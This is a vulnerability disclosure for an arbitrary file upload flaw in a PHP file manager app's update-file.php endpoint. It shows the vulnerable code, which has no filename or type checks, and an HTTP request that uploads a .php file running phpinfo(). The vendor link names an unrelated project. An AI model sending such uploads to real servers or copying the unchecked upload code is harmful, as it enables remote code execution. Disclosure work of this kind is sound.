# SOURCECODESTER / File Manager App - Arbitrary File Upload update-file.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /endpoint/update-file.php

## Code
```php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fileID = $_POST["fileID"];
    $fileTitle = $_POST["fileTitle"];
    $fileUploader = isset($_POST["fileUploader"]) ? $_POST["fileUploader"] : "";

    $newFileName = null;

    if ($_FILES["file"]["name"]) {
        $uploadDirectory = "../file-uploads/";
        $newFileName = $_FILES["file"]["name"];
        $targetFilePath = $uploadDirectory . $newFileName;

        // Check if the file already exists
        if (file_exists($targetFilePath)) {
            echo "
            <script>
                alert('A file with the same name already exists. Please choose a different name for your file.');
                window.location.href = 'http://localhost/file-manager-app/index.php';
            </script>";
        } else {
            // Delete the old file, if it exists
            $sqlGetOldFileName = "SELECT file FROM tbl_file WHERE tbl_file_id = :fileID";
            $stmtGetOldFileName = $conn->prepare($sqlGetOldFileName);
            $stmtGetOldFileName->bindParam(':fileID', $fileID);
            $stmtGetOldFileName->execute();
            $oldFileName = $stmtGetOldFileName->fetchColumn();

            if ($oldFileName) {
                $oldFilePath = $uploadDirectory . $oldFileName;
                if (file_exists($oldFilePath)) {
                    unlink($oldFilePath);
                }
            }

            if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFilePath)) {
                // File uploaded successfully
            } else {
                echo "Error updating the file.";
                exit;
            }
        }
    }
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST //endpoint/update-file.php HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF7Zu0E9rZB71ybiz
Content-Length: 519


------WebKitFormBoundaryF7Zu0E9rZB71ybiz
Content-Disposition: form-data; name="fileID"

11
------WebKitFormBoundaryF7Zu0E9rZB71ybiz
Content-Disposition: form-data; name="fileTitle"

NoChizPlz
------WebKitFormBoundaryF7Zu0E9rZB71ybiz
Content-Disposition: form-data; name="file"; filename="NoChizPlz.php"
Content-Type: application/php

<?php phpinfo()?>
------WebKitFormBoundaryF7Zu0E9rZB71ybiz
Content-Disposition: form-data; name="fileUploader"

NoChizPlz
------WebKitFormBoundaryF7Zu0E9rZB71ybiz--
```

## Screenshot
![img.png](Arbitrary%20File%20Upload%20-%20update-file%2Fimg.png)

